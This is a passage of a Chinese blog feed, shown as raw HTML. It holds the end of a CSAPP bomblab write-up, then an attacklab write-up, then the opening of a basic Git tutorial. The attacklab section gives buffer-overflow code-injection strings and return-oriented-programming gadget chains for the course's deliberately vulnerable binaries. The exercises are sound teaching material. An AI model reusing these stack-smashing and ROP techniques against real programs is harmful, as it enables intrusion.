 callq  0x401204 &lt;fun7&gt;</span><br><span class="line">   0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax</span><br><span class="line">   0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;</span><br><span class="line">   0x000000000040127d &lt;+59&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line"># $0x402438   &quot;Wow! You&#x27;ve defused the secret stage!&quot;</span><br><span class="line">   0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi</span><br><span class="line">   0x0000000000401287 &lt;+69&gt;:    callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040128c &lt;+74&gt;:    callq  0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000401291 &lt;+79&gt;:    pop    %rbx</span><br><span class="line">   0x0000000000401292 &lt;+80&gt;:    retq</span><br></pre></td></tr></table></figure><p>fun7:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function fun7:</span><br><span class="line">   0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi</span><br><span class="line">   0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;</span><br><span class="line">   0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx# edx  root-&gt;val</span><br><span class="line">   0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx# esi  string_number</span><br><span class="line">   0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;</span><br><span class="line">   0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi# 二叉树递归遍历左子树</span><br><span class="line">   0x0000000000401217 &lt;+19&gt;:    callq  0x401204 &lt;fun7&gt;</span><br><span class="line"># 在当前节点进行数据处理</span><br><span class="line">   0x000000000040121c &lt;+24&gt;:    add    %eax,%eax</span><br><span class="line">   0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">   </span><br><span class="line">   0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx</span><br><span class="line">   0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi# 递归遍历右子树</span><br><span class="line">   0x000000000040122d &lt;+41&gt;:    callq  0x401204 &lt;fun7&gt;</span><br><span class="line">   </span><br><span class="line">   0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax</span><br><span class="line">   0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000401241 &lt;+61&gt;:    retq</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int dfs(input_num : esi , root : rdi)// 汇编里函数的返回值是存放在rax的</span><br><span class="line">&#123;</span><br><span class="line">// 先判断根节点是否为空</span><br><span class="line">if(root == NULL)</span><br><span class="line">&#123;</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line">if(input_num &gt; root-&gt;val)</span><br><span class="line">&#123;</span><br><span class="line">return 2 * dfs(input_num, root-&gt;right) + 1;// 递归右子树</span><br><span class="line">&#125;</span><br><span class="line">else if(input_num &lt; root-&gt;val)</span><br><span class="line">&#123;</span><br><span class="line">return 2 * dfs(input_num, root-&gt;left);// 递归左子树</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240221142709933.png" alt="image-20240221142709933"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>看懂代码逻辑之后总结一下隐藏关卡的通过流程：</p><p>​通过查看<code>phase_defused</code>函数发现了有<code>secret_phase</code>，在第四关的答案后加上指定字符串<code>DrEvil</code>即可开启关卡。<code>secret_phase</code>中先读取输入的字符串并将其转为数字（见strtol函数），并将该数字作为参数传入<code>fun7</code>,当<code>fun7</code>函数的返回值为2时即可通过。<code>fun7</code>函数中观察代码发现是一个递归函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    0x8(%rdi),%rdi</span><br><span class="line">mov    0x10(%rdi),%rdi</span><br></pre></td></tr></table></figure><p>根据这两行代码得出与指针有关，进而查看该处的内存进行确认，发现这是二叉树，一个节点中由左右指针及其值组成。得出这是一个二叉树的查找结点函数，并且向左查找<code>eax *= 2</code>, 向右查找<code>eax=2*eax+1</code>，我们利用<code>x/100w 0x6030f0</code>发现该二叉树有4层，最终返回值为2，所以查找方向为<code>左-&gt;右-&gt;左</code>得到我们的输入值应与<code>n43</code>的值相等。所以答案为<code>20</code>。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>之前写过，基本上全是看别人的解答写的，全部忘记了，隐藏关卡没写。</p><p>这次写完全是靠自己慢慢摸索写完的。从bomblab可以学到不少：</p><p>​汇编代码基本能看懂，gdb调试，tmux分屏 等等</p><p><img src="/2024/02/17/CSAPP/image-20240221154454691.png" alt="image-20240221154454691"></p><h1 id="attacklab"><a href="#attacklab" class="headerlink" title="attacklab"></a>attacklab</h1><p><code>ctarget</code> and <code>rtarget</code>两个二进制程序，有<code>buffer overflow bug</code></p><p>二进制程序：</p><p>​<code>ctarget</code>: An executable program vulnerable to code-injection attacks.</p><p>​<code>rtarget</code>: An executable program vulnerable to return-oriented programming attacks.<br>​<code>hex2raw</code> converts these strings into a sequence of raw bytes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; cat exploit.txt | ./hex2raw | ./ctarget</span><br></pre></td></tr></table></figure><p>​<code>farm.c</code>: The source code of this target’s &#96;&#96;gadget farm,’’ which are<br>​    used in generating return-oriented programming attacks.</p><h2 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h2><h3 id="ctarget"><a href="#ctarget" class="headerlink" title="ctarget"></a>ctarget</h3><h4 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h4><p>根据官方的 pdf ，执行<code>test</code>函数时在<code>getbuf</code>函数返回时跳转到<code>touch1</code>函数。</p><p>首先使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.s# 得到程序的汇编代码</span><br></pre></td></tr></table></figure><p>在<code>ctarget.s</code>文件中查看<code>getbuf</code>函数</p><p><img src="/2024/02/17/CSAPP/image-20240222190139430.png" alt="image-20240222190139430"></p><p>得到<code>BUFFER_SIZE</code>的大小为<code>0x28</code>即40。</p><p>因此我们填入40个字符加上<code>touch</code>函数的地址。</p><p><img src="/2024/02/17/CSAPP/image-20240222192017133.png" alt="image-20240222192017133"></p><p>上方的40个字符随意，下面的是<code>00000000004017c0</code>，<code>touch1</code>的地址，按小端法存放。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; phase1.txt &gt; phase1_ans.txt# 将答案文件作为输入放入程序中</span><br><span class="line"># 执行文件，通过phase1</span><br><span class="line">./ctarget -i phase1_ans.txt -q</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240222192402619.png" alt="image-20240222192402619"></p><h4 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h4><p>需要跳转到<code>touch2</code>函数，但是要求我们需要带参数<code>cookie</code>参数已经告诉我们是存放在<code>rdi</code>中，值为<code>0x59b997fa</code>。</p><p>解题思路：</p><p>​执行到test函数中的getbuf函数，读取我们输入的字符串并修改test函数的返回值。</p><p>​我们知道函数执行前会先将参数值push进栈。所以我们不能直接返回touch2的地址(<code>00000000004017ec</code>)。</p><p>​因此我们需要返回到我们注入的代码地址，执行完代码之后再返回到touch2函数的位置。</p><p>​汇编语言中ret指令实质上是跳转到栈顶存储的位置。栈顶位置<code>0x5561dc78</code></p><p>​</p><p>需要注入的汇编代码：(code.s)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi   # push the value of cookie</span><br><span class="line">pushq $0x4017ec                 # touch2 address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>然后编译反编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c code.s</span><br><span class="line">objdump -d code.o</span><br></pre></td></tr></table></figure><p>查看code.o可以得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure><p>因为我们要先跳转到栈上执行我们注入的命令，所以先调试一下程序在getbuf函数下断点，等分好getbuf的栈帧，查看一下位置即可。是<code>0x5561dc78</code></p><p>最终输入为：(phase2.txt)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat phase2.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240222213546729.png" alt="image-20240222213546729"></p><h4 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h4><p>需要我们把参数由数字改成字符串传入。</p><p><code>touch3</code> ： <code>0x4018fa</code></p><p>输入位置：<code>0x5561dc78</code></p><p><code>cookie</code> : <code>0x59b997fa</code></p><p>答案是这个：</p><p><img src="/2024/02/17/CSAPP/image-20240225212255938.png" alt="image-20240225212255938"></p><p>最后一行是cookie的字符串的hex，不放在中间的原因是在hexmatch函数里会分配一个比较大的空间在栈上，把前面的全部覆盖，但是最后一行的话是到了test函数的栈帧，所以不会覆盖。</p><h3 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h3><h4 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h4><p><strong>目标：完成phase2的任务</strong></p><p>movq : The codes for these are shown in Figure 3A.<br>    popq : The codes for these are shown in Figure 3B.<br>    ret : This instruction is encoded by the single byte 0xc3.<br>    nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p><p>Some Advice:</p><ul><li>All the gadgets you need can be found in the region of the code for rtarget demarcated by the<br>functions start_farm and mid_farm.</li><li>You can do this attack with just two gadgets.</li><li>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit<br>string will contain a combination of gadget addresses and data.</li></ul><p>可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop $rax$58</span><br><span class="line">​mov $rax$, %rdi  48 89 c7</span><br><span class="line">​ret c3</span><br></pre></td></tr></table></figure><p>栈：</p><p> 先到此处4019ab，pop %rax(栈上放0x59b997fa 4019c5)，ret 到 4019c5, 执行mov $rax$, %rdi,然后ret 到touch2(栈上放4017ec，即touch2)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00# 最初跳转到&lt;addval_219&gt;内执行pop %rax 和 ret指令</span><br><span class="line">fa 97 b9 59 00 00 00 00 # 放入栈中等pop %rax指令</span><br><span class="line">c5 19 40 00 00 00 00 00# 执行&lt;addval_219&gt;的ret指令，存放的是&lt;setval_426&gt;中的位置，执行将参数cookie放入%rdi和ret返回touch2的位置</span><br><span class="line">ec 17 40 00 00 00 00 00# 存放touch2的地址，执行&lt;setval_426&gt;的ret指令时到达</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240227180827121.png" alt="image-20240227180827121"></p><h4 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h4><p><code>touch3</code> ： <code>0x4018fa</code></p><p><code>cookie</code> : <code>0x59b997fa</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00# movq %rsp, %rax</span><br><span class="line">c5 19 40 00 00 00 00 00# movq %rax, %rdi</span><br><span class="line">ab 19 40 00 00 00 00 00# popq %rax</span><br><span class="line">40 00 00 00 00 00 00 00# 0x40</span><br><span class="line">dd 19 40 00 00 00 00 00# movl %eax, %edx</span><br><span class="line">69 1a 40 00 00 00 00 00# movl %edx, %ecx</span><br><span class="line">13 1a 40 00 00 00 00 00# movl %ecx, %esi</span><br><span class="line">d6 19 40 00 00 00 00 00# lea  (%rdi,%rsi,1),%rax</span><br><span class="line">c5 19 40 00 00 00 00 00# movq %rax, %rdi</span><br><span class="line">fa 18 40 00 00 00 00 00# touch3</span><br><span class="line">35 39 62 39 39 37 66 61 00 # cookie </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/505497911&quot;&gt;CSAPP一键环境配置、完成8个lab总结 - 知乎 (zhihu.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;datalab&quot;&gt;&lt;a href=&quot;#d</summary>
      
    
    
    
    <category term="体系结构" scheme="https://1xueyu1.github.io/categories/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    
    <category term="CSAPP" scheme="https://1xueyu1.github.io/categories/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/CSAPP/"/>
    
    
  </entry>
  
  <entry>
    <title>Git-tutorial</title>
    <link href="https://1xueyu1.github.io/2024/02/16/Git-learning/"/>
    <id>https://1xueyu1.github.io/2024/02/16/Git-learning/</id>
    <published>2024-02-16T08:39:01.000Z</published>
    <updated>2024-03-15T02:24:51.022Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/896827951938304">创建版本库 - 廖雪峰的官方网站 (liaoxuefeng.com)</a></p><h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="仓库管理"><a href="#仓库管理" class="headerlink" title="仓库管理"></a>仓库管理</h2><ul><li><p><code>git init</code>将当前目录变成Git可以管理的仓库</p></li><li><p><code>git add</code>将指定文件添加到仓库</p></li></ul><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git add readme.txt</span><br><span class="line">$ git add .</span><br></pre></td></tr></table></figure><ul><li><p><code>git commit -m &quot;explanation text&quot;</code>告诉Git，把文件提交到仓库</p></li><li><p><code>git status</code>显示当前仓库状态</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">modified:   readme.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure><p>上面的命令输出告诉我们，<code>readme.txt</code>被修改过了，但还没有准备提交的修改。</p><p><img src="/2024/02/16/Git-learning/image-20240216165813680.png" alt="image-20240216165813680"></p><p><img src="/2024/02/16/Git-learning/image-20240216170024339.png" alt="image-20240216170024339"></p><p>红色代表文件被修但是没被添加到仓库中</p><p>绿色代表文件已经被添加到仓库中，并且可以commit了</p><ul><li><code>git diff file</code> 查看文件修改内容 (<strong>暂存区</strong>和<strong>工作区</strong>的文件不同)</li><li><code>git diff HEAD readme.md</code>查看（<strong>最近一次提交</strong>和<strong>暂存区</strong>的文件内容的不同）</li></ul><p>虽然Git告诉我们<code>readme.txt</code>被修改了，但如果能看看具体修改了什么内容，自然是很好的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git diff readme.txt </span><br><span class="line">diff --git a/readme.txt b/readme.txt</span><br><span class="line">index 46d49bf..9247db6 100644</span><br><span class="line">--- a/readme.txt</span><br><span class="line">+++ b/readme.txt</span><br><span class="line">@@ -1,2 +1,2 @@</span><br><span class="line">-Git is a version control system.</span><br><span class="line">+Git is a distributed version control system.</span><br><span class="line"> Git is free software.</span><br></pre></td></tr></table></figure><h2 id="Git-版本控制"><a href="#Git-版本控制" class="headerlink" title="Git 版本控制"></a>Git 版本控制</h2><ul><li><code>git log</code> 显示从最近到最远的提交日志</li></ul><p><img src="/2024/02/16/Git-learning/image-20240216170429663.png" alt="image-20240216170429663"></p><p>如果嫌输出信息太多，看得眼花缭乱的，可以试试加上<code>--pretty=oneline</code>参数：</p><p><img src="/2024/02/16/Git-learning/image-20240216170603449.png" alt="image-20240216170603449"></p><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>首先，Git必须知道当前版本是哪个版本，在Git中，用<code>HEAD</code>表示当前版本, 上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>, 多个版本可以写成<code>HEAD~100</code>。</p><ul><li><code>git reset --hard commit_id</code> 将版本回退</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard HEAD^</span><br><span class="line">HEAD is now at e475afc add distributed</span><br></pre></td></tr></table></figure><p><code>--hard</code>参数有啥意义？这个后面再讲，现在你先放心使用。</p><p>下面回退到上一个版本，可以发现文件内容已经改变了</p><p><img src="/2024/02/16/Git-learning/image-20240216171541456.png" alt="image-20240216171541456"></p><p>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的<code>HEAD</code>指针，版本回退实际上是指针指向另一个状态。</p><p>如果向找回版本，即第三次commit，现在又找不到它的版本号，可以使用命令<code>git reflog</code></p><ul><li><code>git reflog</code>显示你的每一次命令</li></ul><p><img src="/2024/02/16/Git-learning/image-20240216172246717.png" alt="image-20240216172246717"></p><p>从输出可知上一个版本的commit_id</p><p><img src="/2024/02/16/Git-learning/image-20240216172416962.png" alt="image-20240216172416962"></p><p>然后返回到最开始的版本</p><h2 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h2><h4 id="工作区（Working-Directory）"><a href="#工作区（Working-Directory）" class="headerlink" title="工作区（Working Directory）"></a>工作区（Working Directory）</h4><p>就是你在电脑里能看到的目录</p><h4 id="版本库（Repository）"><a href="#版本库（Repository）" class="headerlink" title="版本库（Repository）"></a>版本库（Repository）</h4><p>工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库。</p><p>Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p><p><img src="/2024/02/16/Git-learning/image-20240216173312670.png" alt="image-20240216173312670"></p><p>分支和<code>HEAD</code>的概念后面再看</p><p>前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的：</p><p>第一步是用<code>git add</code>把文件添加进去，实际上就是把文件修改添加到暂存区；</p><p>第二步是用<code>git commit</code>提交更改，实际上就是把暂存区的所有内容提交到当前分支。</p><p>因为我们创建Git版本库时，Git自动为我们创建了唯一一个<code>master</code>分支，所以，现在，<code>git commit</code>就是往<code>master</code>分支上提交更改。</p><p>你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p><p><img src="/2024/02/16/Git-learning/image-20240216173704830.png" alt="image-20240216173704830"></p><p>当前一个文件被修改了，另一个还从来没有被添加过，所以状态时<code>Untracked</code>。</p><p><img src="/2024/02/16/Git-learning/image-20240216173850786.png" alt="image-20240216173850786"></p><p>当前两个文件都被添加到暂存区中了，然后commit，暂存区就清空了</p><p><img src="/2024/02/16/Git-learning/image-20240216174145248.png" alt="image-20240216174145248"></p><p>提交后，用<code>git diff HEAD -- readme.txt</code>命令可以查看工作区和版本库里面最新版本的区别：</p><p>通过下面操作</p><p>第一次修改 -&gt; <code>git add</code> -&gt; 第二次修改 -&gt; <code>git commit</code></p><p>可以发现第二次修改在暂存区中，第一次修改被提交了</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><code>git add</code>添加到暂存区中，<code>git commit</code>提交到版本库中</p><h2 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h2><h3 id="未添加到暂存区"><a href="#未添加到暂存区" class="headerlink" title="未添加到暂存区"></a>未添加到暂存区</h3><p><code>git checkout -- file</code>可以丢弃工作区的修改：</p><p>命令<code>git checkout -- readme.md</code>意思就是，把<code>readme.md</code>文件在工作区的修改全部撤销,<code>readme.md</code>自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；即最近一次<code>git commit</code></p><p><code>git checkout -- file</code>命令中的<code>--</code>很重要，没有<code>--</code>，就变成了“切换到另一个分支”的命令，我们在后面的分支管理中会再次遇到<code>git checkout</code>命令。</p><p><code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用<code>HEAD</code>时，表示最新的版本。</p><h3 id="已经添加到暂存区"><a href="#已经添加到暂存区" class="headerlink" title="已经添加到暂存区"></a>已经添加到暂存区</h3><p>命令<code>git reset HEAD &lt;file&gt;</code>可以把暂存区的修改撤销掉（unstage），重新放回工作区：</p><p><img src="/2024/02/16/Git-learning/image-20240216180959059.png" alt="image-20240216180959059"></p><p>现在暂存区是干净的，工作区有修改</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><ul><li>场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令<code>git checkout -- file</code>。</li><li>场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了场景1，第二步按场景1操作。</li><li>场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，<code>git reset HEAD^</code>，不过前提是没有推送到远程库。</li></ul><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><ul><li><p><code>git rm file</code>删除版本库的文件</p></li><li><p>另一种情况是删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -- test.txt</span><br></pre></td></tr></table></figure><p><code>git checkout</code>其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。</p></li></ul><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><h3 id="添加远程仓库"><a href="#添加远程仓库" class="headerlink" title="添加远程仓库"></a>添加远程仓库</h3><p>将本地仓库与远程仓库关联</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin git@github.com:your repo</span><br></pre></td></tr></table></figure><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><h3 id="删除远程仓库"><a href="#删除远程仓库" class="headerlink" title="删除远程仓库"></a>删除远程仓库</h3><p>如果添加的时候地址写错了，或者就是想删除远程库，可以用<code>git remote rm &lt;name&gt;</code>命令。使用前，建议先用<code>git remote -v</code>查看远程库信息：</p><p><img src="/2024/02/16/Git-learning/image-20240216192231561.png" alt="image-20240216192231561"></p><p>然后，根据名字删除，比如删除<code>origin</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote rm origin</span><br></pre></td></tr></table></figure><p>此处的“删除”其实是解除了本地和远程的绑定关系，并不是物理上删除了远程库。远程库本身并没有任何改动。要真正删除远程库，需要登录到GitHub，在后台页面找到删除按钮再删除。</p><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>每次提交，Git都把它们串成一条时间线，这条时间线就是一个分支。</p><h3 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b branchName</span><br></pre></td></tr></table></figure><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git branch branchName</span><br><span class="line">$ git checkout branchName</span><br></pre></td></tr></table></figure><p>然后，用<code>git branch</code>命令查看当前分支</p><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><p><code>git merge</code>命令用于合并指定分支到当前分支。</p><h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d branchName</span><br></pre></td></tr></table></figure><hr><hr><hr><p><code>git switch -c branchName</code> 创建并切换到新分支</p><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>Git鼓励大量使用分支：</p><p>查看分支：<code>git branch</code></p><p>创建分支：<code>git branch &lt;name&gt;</code></p><p>切换分支：<code>git checkout 